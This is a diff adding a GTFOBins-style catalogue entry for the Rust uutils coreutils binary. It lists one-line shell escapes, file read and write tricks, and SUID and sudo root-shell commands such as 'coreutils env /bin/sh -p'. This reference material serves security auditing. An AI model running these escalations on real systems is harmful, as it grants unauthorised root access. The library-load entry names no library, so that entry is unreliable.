@@ -1,0 +1,49 @@
+---
+description: >
+  Rust multi-call binary providing implementations of common Unix utilities.
+  Default on Ubuntu 26.04+ as `coreutils-from-uutils` (package `rust-coreutils`).
+  Analogous to [busybox](/gtfobins/busybox/) but for desktop/server distributions.
+functions:
+  shell:
+    - description: Spawn a shell via the `env` applet.
+      code: coreutils env /bin/sh
+    - description: Spawn a shell via the `timeout` applet.
+      code: coreutils timeout --foreground 9999 /bin/sh
+  command:
+    - description: Execute a command via the `env` applet.
+      code: coreutils env COMMAND
+    - description: Execute a command via the `nice` applet.
+      code: coreutils nice COMMAND
+    - description: Execute a command via the `nohup` applet.
+      code: coreutils nohup COMMAND
+    - description: Execute a command via the `timeout` applet.
+      code: coreutils timeout --foreground 9999 COMMAND
+  file-read:
+    - description: Read a file via the `cat` applet.
+      code: coreutils cat FILE
+    - description: Read a file via the `head` applet.
+      code: coreutils head -c 999999 FILE
+  file-write:
+    - description: Write to a file via the `tee` applet.
+      code: echo DATA | coreutils tee FILE
+    - description: Copy a file via the `cp` applet.
+      code: coreutils cp SOURCE DEST
+  suid:
+    - description: >
+        If the binary has the SUID bit set, it does not drop the elevated
+        privileges and may be abused to access the file system, escalate
+        or maintain privileged access as a SUID backdoor. If it is used
+        to run `sh -p`, omit the `-p` argument on systems like Debian
+        that allow the default `sh` shell to run with SUID privileges.
+      code: |
+        coreutils env /bin/sh -p
+    - description: Spawn a root shell by chrooting.
+      code: |
+        coreutils chroot / /bin/sh -p
+  sudo:
+    - description: If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+      code: sudo coreutils env /bin/sh
+  library-load:
+    - description: Load a shared library via the `stdbuf` applet, which sets `LD_PRELOAD`.
+      code: coreutils stdbuf -oL /bin/sh
+---
